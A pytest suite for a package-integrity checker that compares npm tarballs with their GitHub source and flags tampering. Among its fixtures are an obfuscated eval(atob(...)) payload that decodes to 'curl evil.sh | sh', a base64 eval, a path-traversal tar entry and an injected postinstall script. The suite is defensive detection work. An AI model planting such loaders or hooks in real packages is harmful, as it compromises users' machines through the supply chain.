"""Shared comparison / classification behaviour, exercised through npm (the original pipeline) and the
detector directly. PyPI-specific end-to-end cases live in test_pypi.py."""
import base64
import hashlib
import json

import httpx
import pytest
import respx

from app.services import orchestrator
from app.services.comparator import align_paths, compare_manifests
from app.services.generated_file_detector import EXPECTED, NOT_GENERATED, UNCERTAIN, GeneratedFileDetector
from app.services.manifest_generator import FileRecord, generate_manifest
from app.utils.errors import VersionNotFoundError
from tests.conftest import make_tar_gz

NAME, VER = "widget", "2.0.0"
REPO = {"type": "git", "url": "https://github.com/acme/widget.git"}
PKG_JSON = {"name": NAME, "version": VER, "main": "dist/index.js", "types": "dist/index.d.ts",
            "scripts": {"build": "tsc"}, "repository": REPO}


def _integrity(data: bytes) -> str:
    return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()


def _j(obj) -> bytes:
    return json.dumps(obj).encode()


def mock_npm(published: dict, source: dict, *, modes=None):
    tar = make_tar_gz(published, root_dir="package")
    manifest = json.loads(published["package.json"]) if "package.json" in published else PKG_JSON
    respx.get(f"https://registry.npmjs.org/{NAME}/{VER}").mock(return_value=httpx.Response(200, json={
        "name": NAME, "version": VER, "repository": REPO, "scripts": manifest.get("scripts", {}),
        "dependencies": manifest.get("dependencies", {}),
        "dist": {"tarball": f"https://registry.npmjs.org/{NAME}/-/{NAME}-{VER}.tgz", "integrity": _integrity(tar)},
    }))
    respx.get(f"https://registry.npmjs.org/{NAME}/-/{NAME}-{VER}.tgz").mock(return_value=httpx.Response(200, content=tar))
    respx.get(f"https://api.github.com/repos/acme/widget/git/refs/tags/v{VER}").mock(
        return_value=httpx.Response(200, json={"ref": f"refs/tags/v{VER}"}))
    respx.get(f"https://codeload.github.com/acme/widget/tar.gz/v{VER}").mock(
        return_value=httpx.Response(200, content=make_tar_gz(source, root_dir="widget-v2")))
    return tar


SOURCE = {
    "package.json": _j(PKG_JSON),
    "tsconfig.json": b'{"compilerOptions": {"outDir": "dist"}}',
    "src/index.ts": b"export const a = 1;\n",
    "src/util.ts": b"export const b = 2;\n",
    "README.md": b"# widget\n",
}


def _published(**overrides):
    files = {
        "package.json": _j(PKG_JSON),
        "dist/index.js": b'"use strict";exports.a=1;\n',
        "dist/index.d.ts": b"export declare const a = 1;\n",
        "dist/util.js": b'"use strict";exports.b=2;\n',
        "README.md": b"# widget\n",
    }
    files.update(overrides)
    return {k: v for k, v in files.items() if v is not None}


# ------------------------------------------------------------------------------- npm scenarios

@respx.mock
async def test_legitimate_generated_files_are_expected_and_verified():
    mock_npm(_published(), SOURCE)
    report = await orchestrator.analyze_package(NAME, VER)
    by_path = {e["path"]: e for e in report["comparison"]}
    for generated in ("dist/index.js", "dist/index.d.ts", "dist/util.js"):
        assert by_path[generated]["status"] == "EXPECTED_GENERATED", by_path[generated]
        assert by_path[generated]["evidence"]
    assert by_path["README.md"]["status"] == "IDENTICAL"
    assert report["summary"]["uncertain"] == 0
    assert report["risk"]["verdict"] == "VERIFIED", report["findings"]


@respx.mock
async def test_added_removed_and_modified_files_are_reported():
    source = dict(SOURCE, **{"CHANGELOG.md": b"old\n", "docs/guide.md": b"guide\n"})
    published = _published(**{"README.md": b"# widget (edited)\n", "extra/notes.txt": b"hello\n"})
    mock_npm(published, source)
    report = await orchestrator.analyze_package(NAME, VER)
    status = {e["path"]: e["status"] for e in report["comparison"]}
    assert status["extra/notes.txt"] == "ADDED"
    assert status["CHANGELOG.md"] == "REMOVED" and status["docs/guide.md"] == "REMOVED"
    assert status["README.md"] == "MODIFIED"
    assert report["summary"]["added"] == 1 and report["summary"]["removed"] >= 2


@respx.mock
async def test_malicious_file_hidden_in_dist_is_not_trusted():
    """The classic bypass: drop a payload into dist/ and hope the directory name earns it a pass."""
    payload = b"eval(atob('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgZXZpbC5zaCB8IHNoJyk='));\n"
    mock_npm(_published(**{"dist/payload.js": payload}), SOURCE)
    report = await orchestrator.analyze_package(NAME, VER)
    entry = next(e for e in report["comparison"] if e["path"] == "dist/payload.js")
    assert entry["status"] == "UNCERTAIN"
    assert any(f["rule_id"] == "SUSPICIOUS_CONTENT_IN_CHANGED_FILE" and f["file"] == "dist/payload.js" for f in report["findings"])
    assert report["risk"]["verdict"] == "HIGH_RISK"


@respx.mock
async def test_tampering_inside_a_legitimately_generated_file_is_caught():
    """dist/index.js has a real source counterpart (src/index.ts) - but its content is hostile, so the
    evidence is overridden."""
    bad = b'"use strict";exports.a=1;eval(Buffer.from("cHJvY2Vzcy5leGl0KCk=","base64").toString());\n'
    mock_npm(_published(**{"dist/index.js": bad}), SOURCE)
    report = await orchestrator.analyze_package(NAME, VER)
    entry = next(e for e in report["comparison"] if e["path"] == "dist/index.js")
    assert entry["status"] == "UNCERTAIN"
    assert report["risk"]["verdict"] == "HIGH_RISK"


@respx.mock
async def test_unremarkable_added_file_in_dist_is_uncertain_and_blocks_verified():
    mock_npm(_published(**{"dist/mystery.js": b"console.log('hi');\n"}), SOURCE)
    report = await orchestrator.analyze_package(NAME, VER)
    entry = next(e for e in report["comparison"] if e["path"] == "dist/mystery.js")
    assert entry["status"] == "UNCERTAIN"
    assert report["risk"]["verdict"] == "WARNING"
    assert any(f["rule_id"] == "GENERATED_FILE_UNVERIFIED" for f in report["findings"])


@respx.mock
async def test_executable_in_dist_is_never_generated():
    mock_npm(_published(), SOURCE)
    # re-mock the tarball with an executable shebang file inside dist/
    pub = _published(**{"dist/run.js": b"#!/usr/bin/env node\nconsole.log(1)\n"})
    mock_npm(pub, SOURCE)
    report = await orchestrator.analyze_package(NAME, VER)
    entry = next(e for e in report["comparison"] if e["path"] == "dist/run.js")
    assert entry["status"] == "ADDED"
    assert any(f["rule_id"] == "UNEXPECTED_EXECUTABLE_FILE" for f in report["findings"])


@respx.mock
async def test_package_json_with_only_metadata_changes_is_not_flagged():
    published_pkg = dict(PKG_JSON, gitHead="a" * 40, _id="widget@2.0.0", readme="long text")
    mock_npm(_published(**{"package.json": _j(published_pkg)}), SOURCE)
    report = await orchestrator.analyze_package(NAME, VER)
    entry = next(e for e in report["comparison"] if e["path"] == "package.json")
    assert entry["status"] == "MODIFIED" and "publish-time metadata" in entry["reason"]
    assert not any(f["rule_id"] == "UNEXPLAINED_SOURCE_DIFF" and f["file"] == "package.json" for f in report["findings"])


@respx.mock
async def test_package_json_with_new_script_is_flagged():
    published_pkg = dict(PKG_JSON, scripts={"build": "tsc", "postinstall": "node dist/util.js"})
    mock_npm(_published(**{"package.json": _j(published_pkg)}), SOURCE)
    report = await orchestrator.analyze_package(NAME, VER)
    entry = next(e for e in report["comparison"] if e["path"] == "package.json")
    assert entry["status"] == "UNEXPLAINED" and "scripts" in entry["reason"]
    assert report["risk"]["verdict"] == "HIGH_RISK"


@respx.mock
async def test_manifest_confusion_between_registry_and_tarball_is_high_risk():
    tar = make_tar_gz(_published(**{"package.json": _j(dict(PKG_JSON, scripts={"postinstall": "node dist/util.js"}))}), root_dir="package")
    respx.get(f"https://registry.npmjs.org/{NAME}/{VER}").mock(return_value=httpx.Response(200, json={
        "name": NAME, "version": VER, "repository": REPO, "scripts": {"build": "tsc"},  # the registry shows something harmless
        "dist": {"tarball": f"https://registry.npmjs.org/{NAME}/-/w.tgz", "integrity": _integrity(tar)}}))
    respx.get(f"https://registry.npmjs.org/{NAME}/-/w.tgz").mock(return_value=httpx.Response(200, content=tar))
    respx.get(f"https://api.github.com/repos/acme/widget/git/refs/tags/v{VER}").mock(return_value=httpx.Response(404))
    respx.get(f"https://api.github.com/repos/acme/widget/git/refs/tags/{VER}").mock(return_value=httpx.Response(404))
    for tag in (f"{NAME}@{VER}", f"{NAME}-{VER}", f"release-{VER}"):
        respx.get(f"https://api.github.com/repos/acme/widget/git/refs/tags/{tag}").mock(return_value=httpx.Response(404))
    report = await orchestrator.analyze_package(NAME, VER)
    assert any(f["rule_id"] == "MANIFEST_CONFUSION" for f in report["findings"])
    assert any(f["rule_id"] == "LIFECYCLE_SCRIPT_PRESENT" for f in report["findings"])  # read from the tarball, not the API
    assert report["risk"]["verdict"] == "HIGH_RISK"


@respx.mock
async def test_wrong_version_is_a_404():
    respx.get(f"https://registry.npmjs.org/{NAME}/9.9.9").mock(return_value=httpx.Response(404))
    respx.get(f"https://registry.npmjs.org/{NAME}").mock(return_value=httpx.Response(200, json={"name": NAME}))
    with pytest.raises(VersionNotFoundError):
        await orchestrator.analyze_package(NAME, "9.9.9")


@respx.mock
async def test_invalid_published_archive_degrades_to_a_report():
    junk = b"this is not an archive at all"
    respx.get(f"https://registry.npmjs.org/{NAME}/{VER}").mock(return_value=httpx.Response(200, json={
        "name": NAME, "version": VER, "dist": {"tarball": f"https://registry.npmjs.org/{NAME}/-/w.tgz", "integrity": _integrity(junk)}}))
    respx.get(f"https://registry.npmjs.org/{NAME}/-/w.tgz").mock(return_value=httpx.Response(200, content=junk))
    report = await orchestrator.analyze_package(NAME, VER)
    assert report["analysis_complete"] is False
    assert any("could not be read" in lim for lim in report["limitations"])


@respx.mock
async def test_path_traversal_in_published_npm_tarball_is_flagged():
    evil = make_tar_gz({"../../outside.txt": b"x"})
    respx.get(f"https://registry.npmjs.org/{NAME}/{VER}").mock(return_value=httpx.Response(200, json={
        "name": NAME, "version": VER, "dist": {"tarball": f"https://registry.npmjs.org/{NAME}/-/w.tgz", "integrity": _integrity(evil)}}))
    respx.get(f"https://registry.npmjs.org/{NAME}/-/w.tgz").mock(return_value=httpx.Response(200, content=evil))
    report = await orchestrator.analyze_package(NAME, VER)
    assert report["findings"][0]["rule_id"] == "UNSAFE_ARCHIVE"
    assert report["risk"]["verdict"] == "HIGH_RISK"


@respx.mock
async def test_explicit_repository_overrides_missing_metadata():
    tar = make_tar_gz(_published(), root_dir="package")
    respx.get(f"https://registry.npmjs.org/{NAME}/{VER}").mock(return_value=httpx.Response(200, json={
        "name": NAME, "version": VER, "dist": {"tarball": f"https://registry.npmjs.org/{NAME}/-/w.tgz", "integrity": _integrity(tar)}}))
    respx.get(f"https://registry.npmjs.org/{NAME}/-/w.tgz").mock(return_value=httpx.Response(200, content=tar))
    respx.get(f"https://api.github.com/repos/acme/widget/git/refs/tags/v{VER}").mock(
        return_value=httpx.Response(200, json={"ref": f"refs/tags/v{VER}"}))
    respx.get(f"https://codeload.github.com/acme/widget/tar.gz/v{VER}").mock(
        return_value=httpx.Response(200, content=make_tar_gz(SOURCE, root_dir="widget-v2")))
    report = await orchestrator.analyze_package(NAME, VER, repository_url="https://github.com/acme/widget")
    assert report["source"]["repository"] == "https://github.com/acme/widget"
    assert report["source"]["confidence"] == "MEDIUM"
    assert any("supplied by the user" in n for n in report["source"]["notes"])


# ------------------------------------------------------------------------------- detector / aligner units

def _rec(path, content=b"x", executable=False):
    return FileRecord(path=path, size=len(content), sha256=hashlib.sha256(content).hexdigest(),
                      extension="." + path.rsplit(".", 1)[-1], category="other", is_executable=executable)


def test_blocked_extensions_and_executables_are_never_generated():
    src = {"src/a.ts": _rec("src/a.ts")}
    pub = {"dist/a.sh": _rec("dist/a.sh"), "dist/b.js": _rec("dist/b.js", executable=True)}
    detector = GeneratedFileDetector(source_manifest=src, published_manifest=pub)
    assert detector.classify("dist/a.sh", in_source=False).status == NOT_GENERATED
    assert detector.classify("dist/b.js", in_source=False).status == NOT_GENERATED


def test_declared_bin_executable_may_still_be_generated():
    src = {"src/cli.ts": _rec("src/cli.ts")}
    pub = {"dist/cli.js": _rec("dist/cli.js", executable=True)}
    detector = GeneratedFileDetector(source_manifest=src, published_manifest=pub,
                                     published_package_json={"bin": {"widget": "dist/cli.js"}})
    assert detector.classify("dist/cli.js", in_source=False).status == EXPECTED


def test_compiled_binaries_are_uncertain():
    detector = GeneratedFileDetector(published_manifest={"build/addon.node": _rec("build/addon.node")})
    verdict = detector.classify("build/addon.node", in_source=False)
    assert verdict.status == UNCERTAIN and "cannot be compared" in verdict.reason


def test_source_map_pointing_at_repo_files_is_strong_evidence(tmp_path):
    (tmp_path / "dist").mkdir()
    (tmp_path / "dist/app.js.map").write_text(json.dumps({"version": 3, "sources": ["../src/app.ts"]}))
    src = {"src/app.ts": _rec("src/app.ts")}
    pub = {"dist/app.js.map": _rec("dist/app.js.map")}
    detector = GeneratedFileDetector(source_manifest=src, published_manifest=pub, published_root=tmp_path)
    verdict = detector.classify("dist/app.js.map", in_source=False)
    assert verdict.status == EXPECTED and any("source map" in e for e in verdict.evidence)


def test_source_map_pointing_nowhere_is_uncertain(tmp_path):
    (tmp_path / "dist").mkdir()
    (tmp_path / "dist/app.js.map").write_text(json.dumps({"version": 3, "sources": ["../nope/missing.ts"]}))
    detector = GeneratedFileDetector(source_manifest={"src/app.ts": _rec("src/app.ts")},
                                     published_manifest={"dist/app.js.map": _rec("dist/app.js.map")}, published_root=tmp_path)
    assert detector.classify("dist/app.js.map", in_source=False).status == UNCERTAIN


def test_align_paths_requires_agreement_between_files():
    src = {f"src/pkg/m{i}.py": _rec(f"src/pkg/m{i}.py", b"%d" % i) for i in range(3)}
    pub = {f"pkg/m{i}.py": _rec(f"pkg/m{i}.py", b"%d" % i) for i in range(3)}
    mapping, note = align_paths(src, pub)
    assert mapping["pkg/m0.py"] == "src/pkg/m0.py" and "src/" in note
    # a single coincidental match is not enough
    assert align_paths({"docs/index.js": _rec("docs/index.js")}, {"index.js": _rec("index.js")}) == ({}, None)


def test_comparison_uses_aligned_paths():
    src = {"src/pkg/a.py": _rec("src/pkg/a.py", b"1"), "src/pkg/b.py": _rec("src/pkg/b.py", b"2")}
    pub = {"pkg/a.py": _rec("pkg/a.py", b"1"), "pkg/b.py": _rec("pkg/b.py", b"CHANGED")}
    result = compare_manifests(src, pub, None, ecosystem="pypi", align=True)
    status = {e["path"]: e["status"] for e in result.entries}
    assert status == {"pkg/a.py": "IDENTICAL", "pkg/b.py": "UNEXPLAINED"}
